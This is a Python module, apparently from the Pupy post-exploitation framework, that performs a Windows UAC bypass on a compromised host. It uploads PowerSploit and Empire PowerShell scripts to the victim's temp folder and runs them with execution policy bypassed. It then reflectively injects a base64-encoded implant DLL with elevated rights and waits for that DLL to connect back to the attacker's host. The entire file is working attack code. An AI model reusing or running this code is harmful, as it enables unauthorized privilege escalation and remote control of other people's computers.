# -*- coding: UTF8 -*-

import os, logging
import platform
import pupygen
from rpyc.utils.classic import upload
import base64
from tempfile import gettempdir
import subprocess


def bypassuac_through_trusted_publisher_certificate(module, rootPupyPath):
	'''
	Performs a bypass UAC attack by utilizing the trusted publisher certificate through process injection. 
	'''
	module.client.load_package("psutil")
	module.client.load_package("pupwinutils.processes")
	remoteTempFolder=module.client.conn.modules['os.path'].expandvars("%TEMP%")
	changeMeTag = "$$$CHANGE_ME$$$"
	#First powershell script executed by Invoke-BypassUAC
	mainPowerShellScript = """
	cat $$$CHANGE_ME$$$\Invoke-BypassUAC.txt | Out-String  | iex
	Invoke-BypassUAC -Command 'powershell.exe -ExecutionPolicy Bypass -file $$$CHANGE_ME$$$\secdPowerShellScriptPrivileged.ps1' -Verbose
	"""
	#Second powershell script executed by first main script (privileged)
	secdPowerShellScriptPrivileged = """
	cat $$$CHANGE_ME$$$\Invoke-ReflectivePEInjection.txt | Out-String  | iex
	cat $$$CHANGE_ME$$$\dllFile.txt | Out-String  | iex
	Invoke-ReflectivePEInjection -PEBytes $PEBytes -ForceASLR
	""" 
	mainPowerShellScriptPath = os.path.join(gettempdir(),'mainPowerShellScript.txt')
	logging.info("Creating the main Powershell script in %s locally"%(mainPowerShellScriptPath))
	f = open(mainPowerShellScriptPath,'w+')
	f.write(mainPowerShellScript.replace(changeMeTag, remoteTempFolder))
	f.close()
	secdPowerShellScriptPrivilegedPath = os.path.join(gettempdir(),'secdPowerShellScriptPrivileged.txt')
	logging.info("Creating the second Powershell script in %s locally"%(secdPowerShellScriptPrivilegedPath))
	f = open(secdPowerShellScriptPrivilegedPath,'w+')
	f.write(secdPowerShellScriptPrivileged.replace(changeMeTag, remoteTempFolder))
	f.close()
	logging.info("Uploading powershell code for DLL injection...")
	upload(module.client.conn, os.path.join(rootPupyPath,"pupy", "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1"), module.client.conn.modules['os.path'].join(remoteTempFolder,'Invoke-ReflectivePEInjection.txt'))
	logging.info("Uploading powershell code for UAC Bypass...")
	upload(module.client.conn, os.path.join(rootPupyPath,"pupy", "external", "Empire", "privesc", "Invoke-BypassUAC.ps1"), module.client.conn.modules['os.path'].join(remoteTempFolder,'Invoke-BypassUAC.txt'))
	logging.info("Uploading main powershell script...")
	upload(module.client.conn, mainPowerShellScriptPath, module.client.conn.modules['os.path'].join(remoteTempFolder,'mainPowerShellScript.ps1'))
	logging.info("Uploading second powershell script...")
	upload(module.client.conn, secdPowerShellScriptPrivilegedPath, module.client.conn.modules['os.path'].join(remoteTempFolder,'secdPowerShellScriptPrivileged.ps1'))
	res=module.client.conn.modules['pupy'].get_connect_back_host()
	host, port = res.rsplit(':',1)
	logging.info("Address configured is %s:%s for pupy dll..."%(host,port))
	logging.info("Looking for process architecture...")
	if module.client.conn.modules['pupwinutils.processes'].is_x64_architecture() == True:
		logging.info("Target achitecture is x64, using a x64 dll")
		dllbuff=pupygen.get_edit_pupyx64_dll(module.client.get_conf())
	elif module.client.conn.modules['pupwinutils.processes'].is_x86_architecture() == True:
		logging.info("Target achitecture is x86, using a x86 dll")
		dllbuff=pupygen.get_edit_pupyx86_dll(module.client.get_conf())
	else:
		module.error("Target architecture is unknown (!= x86 or x64), abording...")
		return 
	pupyDLLPath = os.path.join(gettempdir(),'dllFile.txt')
	remotePupyDLLPath = module.client.conn.modules['os.path'].join(remoteTempFolder,'dllFile.txt')
	logging.info("Creating the pupy dll in %s locally"%(pupyDLLPath))
	f = open(pupyDLLPath,'w+')
	f.write('$PEBytes = [System.Convert]::FromBase64String("%s")'%(base64.b64encode(dllbuff)))
	f.close()
	logging.info("Uploading pupy dll...")
	upload(module.client.conn, pupyDLLPath, remotePupyDLLPath)
	output = module.client.conn.modules.subprocess.check_output("PowerShell.exe -ExecutionPolicy Bypass -File %s"%(module.client.conn.modules['os.path'].join(remoteTempFolder,'mainPowerShellScript.ps1')), stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell = True)
	logging.info("BypassUAC script output: %s"%(output))
	if "DLL injection complete!" in output:
		module.success("UAC bypassed")
	else:
		module.warning("Impossible to know what's happened remotely")
	module.success("Waiting for a connection from the DLL (take few seconds)...")





